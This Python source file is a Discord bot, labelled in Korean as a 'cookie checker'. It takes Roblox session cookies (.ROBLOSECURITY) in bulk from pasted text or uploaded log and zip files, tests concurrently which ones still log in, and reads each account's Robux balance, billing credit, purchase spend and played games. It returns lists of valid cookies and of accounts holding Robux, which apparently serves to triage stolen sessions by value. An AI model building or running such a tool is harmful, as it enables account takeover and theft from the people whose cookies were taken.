# -*- coding: utf-8 -*-
import os, re, io, asyncio, aiohttp, datetime as dt, random, zipfile, time
import discord
from discord.ext import commands
from discord import Interaction, TextStyle
from discord.ui import View, Modal, TextInput

# ========================
# 환경변수/설정
# ========================
TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = os.getenv("GUILD_ID")  # 선택

MENU_PUBLIC = True
RESULTS_EPHEMERAL = True

# 속도 우선(1분 내 목표)
FAST_MODE = True  # True: 지출 1p, 배지 30개
CHUNK_SIZE = 500
CONCURRENCY_AUTH = 12
CONCURRENCY_BADGE = 8
CONCURRENCY_ECON = 10
MULTI_FILE_CONCURRENCY = 4
BIND_ATTACHMENTS = True  # 여러 첨부를 합쳐 한 번에 파이프 태움
MAX_TOTAL = 0
MAX_TRX_PAGES = 1 if FAST_MODE else 10

# ========================
# 네트워크
# ========================
AIOHTTP_TIMEOUT = aiohttp.ClientTimeout(total=20, sock_connect=4, sock_read=12)
TCP_CONN: aiohttp.TCPConnector | None = None

def new_session(cookies=None):
    global TCP_CONN
    if TCP_CONN is None:
        TCP_CONN = aiohttp.TCPConnector(
            limit=0, limit_per_host=40, ttl_dns_cache=300, enable_cleanup_closed=True
        )
    return aiohttp.ClientSession(
        timeout=AIOHTTP_TIMEOUT,
        connector=TCP_CONN,
        cookies=cookies or {},
        headers={"Accept-Encoding": "gzip", "Connection": "keep-alive"}
    )

async def fetch_json_with_retry(session: aiohttp.ClientSession, method: str, url: str, **kw):
    tries = 0
    while True:
        tries += 1
        try:
            async with session.request(method, url, **kw) as r:
                if r.status == 429:
                    ra = r.headers.get("Retry-After")
                    wait = float(ra) if ra else min(2 ** tries, 6) + random.random()
                    await asyncio.sleep(wait)
                    if tries < 4:
                        continue
                if 500 <= r.status < 600 and tries < 3:
                    await asyncio.sleep(min(2 ** tries, 4) + random.random())
                    continue
                if r.status >= 400:
                    try:
                        data = await r.json()
                    except:
                        data = {"error": await r.text()}
                    return r.status, data
                return r.status, await r.json()
        except Exception as e:
            if tries >= 3:
                return 599, {"error": f"{type(e).__name__}: {e}"}
            await asyncio.sleep(min(2 ** tries, 3) + random.random())

# ========================
# 공통 UI/포맷
# ========================
COLOR_BASE = discord.Color.from_rgb(0, 0, 0)
COLOR_BLUE = discord.Color.blurple()

def make_embed(title: str | None = None, desc: str = "", color: discord.Color = COLOR_BASE) -> discord.Embed:
    emb = discord.Embed(description=desc, color=color)
    if title:
        emb.title = title
    return emb

def fmt_num(n: int | float) -> str:
    try: return f"{int(n):,}"
    except:
        try: return f"{float(n):,.2f}"
        except: return str(n)

def fmt_rbx(n: int | float) -> str:
    return f"{fmt_num(n)} R$"

def fmt_sec(s: float) -> str:
    return f"{s:.2f}초"

def main_menu_embed() -> discord.Embed:
    return discord.Embed(
        title="쿠키 체커기",
        description="원하는 체커방법을 선택하여 이용해주세요.",
        color=COLOR_BASE
    )

# ========================
# 게임 프리셋(이름만 사용: 이모지 제거)
# ========================
GAMES = {
    "그로우 어 가든": {"key":"grow_a_garden", "universeId":7436755782, "welcomeBadgeIds":[]},
    "입양하세요":    {"key":"adopt_me",      "universeId":383310974,  "welcomeBadgeIds":[]},
    "브레인롯":      {"key":"brainrot",      "universeId":7709344486, "welcomeBadgeIds":[]},
    "블록스피스":    {"key":"blox_fruits",   "universeId":994732206,  "welcomeBadgeIds":[]},
}

# ========================
# 파일/토큰 인식(강화: Order 파일 패턴 + 백업 패턴)
# ========================
SUPPORTED_TEXT_EXT = {".txt", ".log", ".csv", ".json"}
SUPPORTED_ARCHIVE_EXT = {".zip"}

# Order 파일 같은 라인 내 반복 토큰 인식
ORDER_TOKEN_RE = re.compile(r"(_\|WARNING[^\s\"';]+)")

# 백업 패턴(.ROBLOSECURITY, 헤더, JSON)
COOKIE_PATTERNS = [
    re.compile(r"(?i)\.?\s*ROBLOSECURITY\s*=\s*([^\s\"';]+)"),
    re.compile(r"(?i)\"ROBLOSECURITY\"\s*:\s*\"([^\"]+)\""),
    re.compile(r"(?i)Cookie:\s*[^;]*ROBLOSECURITY\s*=\s*([^\s;]+)"),
]

def _clean_token(v: str) -> str:
    return (v or "").replace("\u200b", "").replace("\ufeff", "").strip()

def extract_tokens_from_order_text(text: str) -> list[str]:
    if not text: return []
    return [_clean_token(m.group(1)) for m in ORDER_TOKEN_RE.finditer(text)]

def extract_tokens_fallback(text: str) -> list[str]:
    out = []
    # 1) _|WARNING 우선
    out.extend(extract_tokens_from_order_text(text))
    # 2) 백업 패턴들
    for rgx in COOKIE_PATTERNS:
        for m in rgx.finditer(text or ""):
            raw = _clean_token(m.group(1))
            if "_|WARNING" in raw:
                raw = raw[raw.find("_|WARNING"):]
            if raw:
                out.append(raw)
    return out

def parse_cookies_blob(raw_text: str) -> list[tuple[str, str]]:
    tokens = extract_tokens_fallback(raw_text or "")
    seen = set()
    pairs = []
    for tok in tokens:
        tok = _clean_token(tok)
        if not tok: continue
        if any(ch.isspace() for ch in tok):  # 공백 포함 제거
            continue
        if tok not in seen:
            seen.add(tok)
            pairs.append((tok, tok))
    return pairs

async def extract_texts_from_attachment(att: discord.Attachment):
    name = (att.filename or "file").lower()
    data = await att.read()
    texts = []
    def dec(b: bytes):
        try: return b.decode("utf-8")
        except: return b.decode("utf-8", errors="ignore")
    if any(name.endswith(ext) for ext in SUPPORTED_ARCHIVE_EXT):
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            for info in zf.infolist():
                if info.is_dir(): continue
                lname = info.filename.lower()
                if not any(lname.endswith(ext) for ext in SUPPORTED_TEXT_EXT): continue
                if info.file_size > 8 * 1024 * 1024: continue
                with zf.open(info, "r") as f:
                    texts.append(dec(f.read()))
        return texts or [dec(data)], "zip"
    return [dec(data)], "text"

# ========================
# 인증/데이터 조회(성공률 최우선 3단계)
# ========================
async def check_cookie_once(cookie_value: str):
    # UA + 3단계: settings → mobileapi → users
    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
    HDR = {
        "User-Agent": UA,
        "Referer": "https://www.roblox.com/",
        "Origin": "https://www.roblox.com",
        "Accept": "application/json, text/plain, */*",
        "Connection": "keep-alive",
    }
    token = _clean_token(cookie_value)
    try:
        async with new_session(cookies={'.ROBLOSECURITY': token}) as s:
            stA, dataA = await fetch_json_with_retry(s, "GET", "https://www.roblox.com/my/settings/json", headers=HDR)
            if stA == 200 and isinstance(dataA, dict) and (dataA.get("Name") or dataA.get("UserName")):
                return True, None, None, dataA.get("Name") or dataA.get("UserName")

            stB, dataB = await fetch_json_with_retry(s, "GET", "https://www.roblox.com/mobileapi/userinfo", headers=HDR)
            if stB == 200 and isinstance(dataB, dict) and (dataB.get("UserID") or dataB.get("UserName")):
                uid = dataB.get("UserID")
                uname = dataB.get("UserName") or dataB.get("UserDisplayName")
                return True, None, (int(uid) if uid else None), uname

            stC, dataC = await fetch_json_with_retry(s, "GET", "https://users.roblox.com/v1/users/authenticated", headers=HDR)
            if stC == 200 and isinstance(dataC, dict) and dataC.get("id"):
                return True, None, int(dataC["id"]), dataC.get("name") or dataC.get("displayName")

            bad = stA or stB or stC
            if bad in (401, 403):
                return False, None, None, None
            return False, f"unexpected {bad}", None, None
    except Exception as e:
        return False, f"{type(e).__name__}: {e}", None, None

async def bulk_authenticate(pairs):
    sem = asyncio.Semaphore(CONCURRENCY_AUTH)
    async def worker(auth):
        async with sem:
            return await check_cookie_once(auth)
    return await asyncio.gather(*[worker(auth) for auth, _ in pairs])

async def get_user_badges(user_id: int, session: aiohttp.ClientSession, limit: int):
    out, cursor = [], None
    base = f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100&sortOrder=Desc"
    fetch_limit = limit
    while True:
        url = base + (f"&cursor={cursor}" if cursor else "")
        st, data = await fetch_json_with_retry(session, "GET", url)
        if st != 200: break
        out.extend(data.get("data", []))
        cursor = data.get("nextPageCursor")
        if not cursor or len(out) >= fetch_limit: break
    return out[:fetch_limit]

async def get_played_games_for_user(user_id: int, auth_cookie: str):
    played = set()
    try:
        async with new_session(cookies={'.ROBLOSECURITY': auth_cookie}) as s:
            badges = await get_user_badges(user_id, s, limit=(30 if FAST_MODE else 100))
            uni_by_key = {cfg["key"]: int(cfg["universeId"]) for _, cfg in GAMES.items() if cfg.get("universeId")}
            for b in badges:
                uni = b.get("awardingUniverse")
                if not isinstance(uni, dict): continue
                uid = int(uni.get("id") or 0)
                for k, u in uni_by_key.items():
                    if u == uid:
                        played.add(k)
            return played
    except:
        return played

async def fetch_robux_balance(user_id: int, session: aiohttp.ClientSession) -> int:
    st, data = await fetch_json_with_retry(session, "GET", f"https://economy.roblox.com/v1/users/{user_id}/currency")
    if st == 200 and isinstance(data, dict): return int(data.get("robux", 0))
    return 0

async def sum_total_spend(user_id: int, session: aiohttp.ClientSession, max_pages: int = MAX_TRX_PAGES) -> int:
    total, cursor, pages = 0, None, 0
    base = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=100"
    while pages < max_pages:
        url = base + (f"&cursor={cursor}" if cursor else "")
        st, data = await fetch_json_with_retry(session, "GET", url)
        if st != 200 or not isinstance(data, dict): break
        for row in data.get("data", []):
            amt = int(row.get("amount", 0))
            total += abs(amt)
        cursor = data.get("nextPageCursor")
        pages += 1
        if not cursor: break
    return total

async def get_robux_and_spend(user_id: int, auth_cookie: str) -> tuple[int, int]:
    try:
        async with new_session(cookies={'.ROBLOSECURITY': auth_cookie}) as s:
            bal, spend = await asyncio.gather(
                fetch_robux_balance(user_id, s),
                sum_total_spend(user_id, s, MAX_TRX_PAGES)
            )
            return bal, spend
    except:
        return 0, 0

# ========================
# 처리 도우미/청크
# ========================
def chunked(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i+n]

# ========================
# 파일검증(핵심)
# ========================
async def handle_file_check_logic_dm(dm: discord.DMChannel, raw_text: str):
    pairs = parse_cookies_blob(raw_text)
    if not pairs:
        return await dm.send(embed=make_embed("쿠키 없음", "파일에서 쿠키를 찾지 못했습니다.", color=COLOR_BASE))

    if MAX_TOTAL and len(pairs) > MAX_TOTAL:
        pairs = pairs[:MAX_TOTAL]

    total_cnt = len(pairs)
    done_cnt = 0
    chunk_idx = 0

    for part in chunked(pairs, CHUNK_SIZE):
        chunk_idx += 1
        t0_chunk = time.perf_counter()

        # 1) 인증(동시)
        auth_results = await bulk_authenticate(part)

        # 성공: ok면 uid 없어도 성공(카운트/valid 파일 포함)
        valid_tokens: list[str] = []
        ok_entries: list[tuple[str, str, int, str]] = []  # uid 있는 계정만 (게임/경제용)
        for (auth, outv), res in zip(part, auth_results):
            ok, err, uid, uname = res
            if ok:
                valid_tokens.append(outv)
                if uid:
                    ok_entries.append((auth, outv, uid, uname))

        # 2) 게임 분류(uid 있는 계정만)
        game_buckets: dict[str, list[str]] = {}
        if ok_entries:
            sem_badge = asyncio.Semaphore(CONCURRENCY_BADGE)
            async def one_badge(item):
                auth, outv, uid, uname = item
                async with sem_badge:
                    keys = await get_played_games_for_user(uid, auth)
                    return outv, keys
            played_results = await asyncio.gather(*[one_badge(it) for it in ok_entries])
            for outv, keys in played_results:
                for k in keys:
                    game_buckets.setdefault(k, []).append(outv)

        # 3) 로벅스 요약(uid 있는 계정만)
        total_robux_sum = 0
        total_spend_sum = 0
        robux_positive_list: list[str] = []
        if ok_entries:
            sem_econ = asyncio.Semaphore(CONCURRENCY_ECON)
            async def one_econ(item):
                auth, outv, uid, uname = item
                async with sem_econ:
                    bal, spend = await get_robux_and_spend(uid, auth)
                    return outv, bal, spend
            econ_results = await asyncio.gather(*[one_econ(it) for it in ok_entries])
            for outv, bal, spend in econ_results:
                total_robux_sum += max(bal, 0)
                total_spend_sum += max(spend, 0)
                if bal > 0:
                    robux_positive_list.append(outv)

        # 4) 파일 첨부(필요한 것만)
        files: list[discord.File] = []
        if valid_tokens:
            buf_valid = io.BytesIO(("\n".join(valid_tokens)).encode("utf-8"))
            files.append(discord.File(buf_valid, filename=f"valid_cookies_part{chunk_idx}.txt"))
        if robux_positive_list:
            buf_pos = io.BytesIO(("\n".join(robux_positive_list)).encode("utf-8"))
            files.append(discord.File(buf_pos, filename=f"robux_positive_part{chunk_idx}.txt"))

        # 임베드(이모지 없이 깔끔)
        elapsed_chunk = time.perf_counter() - t0_chunk

        key_to_display = {cfg["key"]: disp for disp, cfg in GAMES.items()}
        order = ["grow_a_garden", "adopt_me", "brainrot", "blox_fruits"]
        pretty_lines = []
        for k in order:
            disp = key_to_display.get(k, k)
            cnt = len(game_buckets.get(k, []))
            pretty_lines.append(f"{disp}: {fmt_num(cnt)}개")

        succ_cnt = len(valid_tokens)
        fail_cnt = len(part) - succ_cnt
        if succ_cnt > 0 and fail_cnt == 0:
            color_pick = discord.Color.from_rgb(0, 180, 110)
            title_emoji = "✅"
        elif succ_cnt > 0 and fail_cnt > 0:
            color_pick = discord.Color.from_rgb(230, 150, 20)
            title_emoji = "⚠️"
        else:
            color_pick = discord.Color.from_rgb(200, 60, 60)
            title_emoji = "❌"

        emb = discord.Embed(
            title=f"{title_emoji} 파일 검증 결과 (청크 {chunk_idx})",
            description=f"[{chunk_idx}] 처리 청크: {fmt_num(len(part))}개",
            color=color_pick
        )
        emb.timestamp = dt.datetime.now(dt.timezone.utc)

        emb.add_field(
            name="검증 수",
            value="\n".join([
                f"총(누적/전체): {fmt_num(done_cnt + len(part))} / {fmt_num(total_cnt)}",
                f"성공: {fmt_num(succ_cnt)}",
                f"실패: {fmt_num(fail_cnt)}",
            ]),
            inline=True
        )
        emb.add_field(
            name="게임플레이",
            value="\n".join(pretty_lines) if pretty_lines else "게임별 분류 결과 없음",
            inline=True
        )
        emb.add_field(
            name="로벅스 요약",
            value="\n".join([
                f"보유 합계: {fmt_rbx(total_robux_sum)}",
                f"지출 합계: {fmt_rbx(total_spend_sum)}",
                f"잔액: {fmt_num(len(robux_positive_list))}개",
            ]),
            inline=False
        )
        emb.add_field(
            name="처리 시간",
            value=f"{fmt_sec(elapsed_chunk)}",
            inline=False
        )
        emb.set_footer(text="Cookie Checker • DM 전용 • 안정 검증 모드")

        done_cnt += len(part)
        await dm.send(embed=emb, files=files or None)

# ========================
# 전체조회(유효한 첫 쿠키 자동 선택)
# ========================
class TotalCheckModal(Modal, title="전체 조회"):
    cookie = TextInput(
        label="로블록스 쿠키",
        placeholder="_|WARNING… 또는 .ROBLOSECURITY=… (여러 개면 줄바꿈)",
        style=TextStyle.paragraph,
        required=True,
        max_length=4000
    )
    async def on_submit(self, inter: Interaction):
        await inter.response.defer(ephemeral=RESULTS_EPHEMERAL)
        try:
            pairs = parse_cookies_blob(self.cookie.value)
            if not pairs:
                return await inter.followup.send(
                    embed=make_embed("입력 필요", "쿠키를 찾지 못했습니다.", color=COLOR_BLUE),
                    ephemeral=True
                )

            def _clean(v: str) -> str:
                return (v or "").replace("\u200b", "").replace("\ufeff", "").strip()

            valid_cookie = None
            for auth, _ in pairs:
                token = _clean(auth)
                ok, _, uid, _ = await check_cookie_once(token)
                if ok:
                    valid_cookie = token
                    break

            if not valid_cookie:
                return await inter.followup.send(
                    embed=make_embed("유효하지 않은 쿠키", "로그인 실패", color=COLOR_BLUE),
                    ephemeral=True
                )

            UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
            async with new_session(cookies={'.ROBLOSECURITY': valid_cookie}) as s:
                st, data = await fetch_json_with_retry(
                    s, "GET", "https://users.roblox.com/v1/users/authenticated",
                    headers={"User-Agent": UA, "Referer": "https://www.roblox.com/", "Origin": "https://www.roblox.com"}
                )
                if st != 200 or not data.get("id"):
                    return await inter.followup.send(
                        embed=make_embed("유효하지 않은 쿠키", "로그인 실패", color=COLOR_BLUE),
                        ephemeral=True
                    )
                user_id = data["id"]

                async def fj(url: str):
                    st, d = await fetch_json_with_retry(s, "GET", url)
                    return d

                robux_task = asyncio.create_task(fj(f'https://economy.roblox.com/v1/users/{user_id}/currency'))
                credit_task = asyncio.create_task(fj('https://billing.roblox.com/v1/credit'))
                settings_task = asyncio.create_task(fj('https://www.roblox.com/my/settings/json'))
                thumb_task = asyncio.create_task(fj(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds={user_id}'))
                spend_task = asyncio.create_task(sum_total_spend(user_id, s, MAX_TRX_PAGES))
                robux, credit, settings, thumb, total_spend = await asyncio.gather(
                    robux_task, credit_task, settings_task, thumb_task, spend_task
                )

            emb = make_embed(title="전체 조회", color=COLOR_BLUE)
            emb.set_thumbnail(url=(thumb.get('data', [{}])[0].get('imageUrl') or discord.Embed.Empty))
            emb.add_field(name="로벅스", value=f"{robux.get('robux', 0)} R$", inline=True)
            emb.add_field(name="전체 지출 합계", value=f"{total_spend} R$", inline=True)
            emb.add_field(name="크레딧", value=f"{credit.get('balance', 0)} {credit.get('currencyCode', '')}", inline=True)
            emb.add_field(name="닉네임", value=str(settings.get('Name')), inline=True)
            await inter.followup.send(embed=emb, ephemeral=True)

        except Exception as e:
            await inter.followup.send(embed=make_embed("요청 실패", f"{type(e).__name__}: {e}", color=COLOR_BLUE), ephemeral=True)

# ========================
# DM 파일검증 뷰(쓸모없는 임베드 제거 + 대량 인증 바인딩)
# ========================
class DMFilePromptView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=120)
        self.bot = bot
        self.busy = False

    @discord.ui.button(label="파일검증", style=discord.ButtonStyle.secondary, custom_id="file_dm_btn")
    async def dm_btn(self, inter: Interaction, button: discord.ui.Button):
        if self.busy:
            return await inter.response.send_message(embed=make_embed("안내", "이미 진행 중입니다. DM 확인해주세요.", color=COLOR_BASE), ephemeral=True)
        self.busy = True
        try:
            dm = await inter.user.create_dm()
        except Exception as e:
            self.busy = False
            return await inter.response.send_message(embed=make_embed("DM 전송 실패", f"DM 허용을 켜주세요. ({e})", color=COLOR_BASE), ephemeral=True)

        await inter.response.send_message(embed=make_embed("DM 안내", "DM 보냈습니다. DM에서 파일 올려주세요.", color=COLOR_BASE), ephemeral=True)

        await dm.send(embed=make_embed(
            title="파일 검증",
            desc="여기에 파일을 올려줘.\n- 지원: txt/log/csv/json/zip\n- 제한: 2분 내 업로드",
            color=COLOR_BASE
        ))

        def check_msg(m: discord.Message):
            return (not m.author.bot) and (m.author.id == inter.user.id) and (m.channel.id == dm.id) and (len(m.attachments) > 0)

        try:
            msg: discord.Message = await self.bot.wait_for("message", check=check_msg, timeout=120)
        except asyncio.TimeoutError:
            self.busy = False
            return await dm.send(embed=make_embed("시간 초과", "다시 서버에서 [파일검증] 눌러 시작해주세요.", color=COLOR_BASE))

        atts = [a for a in msg.attachments if a.size > 0]
        if not atts:
            self.busy = False
            return await dm.send(embed=make_embed("첨부 없음", "파일이 비어있어. 다시 올려줘!", color=COLOR_BASE))

        try:
            if BIND_ATTACHMENTS and len(atts) > 1:
                # 첨부 병렬 읽기 → 합쳐서 한 번에 파이프
                async def read_one(att: discord.Attachment):
                    texts, _ = await extract_texts_from_attachment(att)
                    return "\n\n".join(texts)
                all_texts = await asyncio.gather(*[read_one(a) for a in atts])
                combined = "\n\n".join(all_texts)
                await handle_file_check_logic_dm(dm, combined)
            else:
                # 단일/소수 첨부는 기존 파이프 (동시 파일 처리)
                sem_files = asyncio.Semaphore(MULTI_FILE_CONCURRENCY)
                async def process_one(att: discord.Attachment):
                    async with sem_files:
                        texts, _ = await extract_texts_from_attachment(att)
                        combined = "\n\n".join(texts)
                        await handle_file_check_logic_dm(dm, combined)
                await asyncio.gather(*[process_one(a) for a in atts])
        except Exception as e:
            await dm.send(embed=make_embed("처리 실패", f"{type(e).__name__}: {e}", color=COLOR_BASE))
        finally:
            self.busy = False

# ========================
# 버튼 뷰
# ========================
class CheckView(View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="전체조회", style=discord.ButtonStyle.secondary, custom_id="total_check_btn")
    async def b2(self, inter: Interaction, button: discord.ui.Button):
        await inter.response.send_modal(TotalCheckModal())

    @discord.ui.button(label="파일검증", style=discord.ButtonStyle.secondary, custom_id="file_check_btn")
    async def b3(self, inter: Interaction, button: discord.ui.Button):
        emb = make_embed(
            title="파일 검증",
            desc="아래 버튼을 누르면 봇이 DM 갑니다.",
            color=COLOR_BASE
        )
        view = DMFilePromptView(inter.client)
        await inter.response.send_message(embed=emb, view=view, ephemeral=True)

# ========================
# 봇 본체
# ========================
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix=".", intents=intents)

    async def setup_hook(self):
        try:
            if GUILD_ID:
                gid = int(GUILD_ID)
                await self.tree.sync(guild=discord.Object(id=gid))
            else:
                await self.tree.sync()
        except Exception as e:
            print("[SYNC] 실패:", e)

bot = MyBot()

@bot.event
async def on_ready():
    try:
        bot.add_view(CheckView(bot))  # persistent view
        print("[VIEW] persistent CheckView 등록 완료")
    except Exception as e:
        print("[VIEW] 등록 실패:", e)
    print("[VER] fast=ON, bind=ON, auth=3step(settings->mobile->users), parse=WARNING/_|WARNING, valid=ok(any), uidOnlyForEcon")
    print(f"{dt.datetime.now(dt.timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} UTC → 로그인: {bot.user}")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="Cookie Checker"))

# ========================
# 메뉴/명령
# ========================
@bot.tree.command(name="체커기", description="체커기 생성하기")
async def check(inter: Interaction):
    if MENU_PUBLIC:
        await inter.response.send_message(embed=main_menu_embed(), view=CheckView(bot))
    else:
        await inter.response.send_message(embed=main_menu_embed(), view=CheckView(bot), ephemeral=True)

@bot.tree.command(name="파일검증", description="DM으로 파일을 받아 일괄 검증합니다")
async def file_check(inter: Interaction):
    emb = make_embed("DM 안내", "봇 DM 확인해주세요.", color=COLOR_BASE)
    await inter.response.send_message(embed=emb, ephemeral=True)
    try:
        dm = await inter.user.create_dm()
        await dm.send(embed=make_embed(
            title="파일 검증",
            desc="여기에 파일을 올려주세요.\n- 지원: txt/log/csv/json/zip\n- 제한: 2분 내 업로드",
            color=COLOR_BASE
        ))
    except Exception as e:
        await inter.followup.send(embed=make_embed("DM 전송 실패", f"DM 허용을 켜주세요. ({e})", color=COLOR_BASE), ephemeral=True)

if __name__ == "__main__":
    if not TOKEN:
        raise RuntimeError("환경변수 DISCORD_TOKEN 이 설정되지 않았습니다.")
    bot.run(TOKEN)
